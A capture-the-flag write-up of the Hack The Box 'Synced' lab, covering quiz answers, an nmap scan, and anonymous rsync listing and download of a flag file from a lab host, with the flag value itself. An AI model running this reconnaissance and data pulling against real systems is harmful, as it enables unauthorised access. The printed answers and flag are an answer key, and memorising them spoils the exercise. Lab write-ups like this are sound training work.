---
title: "[HTB] Synced"
author: "Wook Lee"
date: "2024-07-11"
tags: ["Hack The Box"]
---

#### What is the default port for rsync?

```
873
```

<br>

#### How many TCP ports are open on the remote host?

```
1
```

As always, started off by running the nmap scan on all ports and turned out there is only 1 open port on 873 and it's `rsync`.

```shell
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-wv2b0ymwtt]─[~]
└──╼ [★]$ nmap -sC -sV 10.129.49.240 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 12:14 CDT
Nmap scan report for 10.129.49.240
Host is up (0.0092s latency).
Not shown: 65534 closed tcp ports (reset)
PORT STATE SERVICE VERSION
873/tcp open rsync (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.33 seconds
```

<br>

#### What is the protocol version used by rsync on the remote machine?

```
31
```

<br>

#### What is the most common command name on Linux to interact with rsync?

```
rsync
```

**rsync** is an open source utility that provides fast incremental file transfer. The way rsync works makes it an excellent choice when there is a need to synchronize files between a computer and a storage drive and across networked computers.

<br>

#### What credentials do you have to pass to rsync in order to use anonymous authentication? anonymous:anonymous, anonymous, None, rsync:rsync

```
None
```

<br>

#### What is the option to only list shares and files on rsync? (No need to include the leading --characters)

```
list-only
```

![alt text](image.png#center)

<br>

#### Submit root flag

```
72eaf5344ebb84908ae543a719830519
```

The generic syntax used by `rsync` is the following:

```
rsync [OPTION] ... [USER@]HOST::SRC [DEST]
```

where SRC is the file or directory to copy from, DEST is the file or directory to copy to, and square brackets indicate optional parameters.

The `[USER@]` optional parameter is used when we want to access the remote machine in an authetnicated way. In this case, we don't have any valid credentials so we will omit this portion and try an anonymous authentication.

`rsync --list-only 10.129.49.240::`

```shell
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-wv2b0ymwtt]─[~]
└──╼ [★]$ rsync --list-only 10.129.49.240::
public         	Anonymous Share
```

<br>

Notice there is a public directory with the description, Anonymous Share.
Let's navigate to public directory

```shell
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-wv2b0ymwtt]─[~]
└──╼ [★]$ rsync --list-only 10.129.49.240::public
drwxr-xr-x          4,096 2022/10/24 17:02:23 .
-rw-r--r--             33 2022/10/24 16:32:03 flag.txt
```

<br>

okay we see there's the `flag.txt` file. Now let's copy this file to our local machine.
When downloading the file to our local machine, make sure to remove the **_--list-only_** option and specify the destination.

`rsync [OPTION] ... [USER@]HOST::SRC [DEST]`

```shell
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-wv2b0ymwtt]─[~/Desktop]
└──╼ [★]$ rsync 10.129.49.240::public/flag.txt flag.txt
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-wv2b0ymwtt]─[~/Desktop]
└──╼ [★]$ ls
flag.txt  htb_vpn_logs.log  my_credentials.txt  my_data  README.license
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-wv2b0ymwtt]─[~/Desktop]
└──╼ [★]$ cat flag.txt
72eaf5344ebb84908ae543a719830519
```

<br>

![alt text](image-1.png#center)
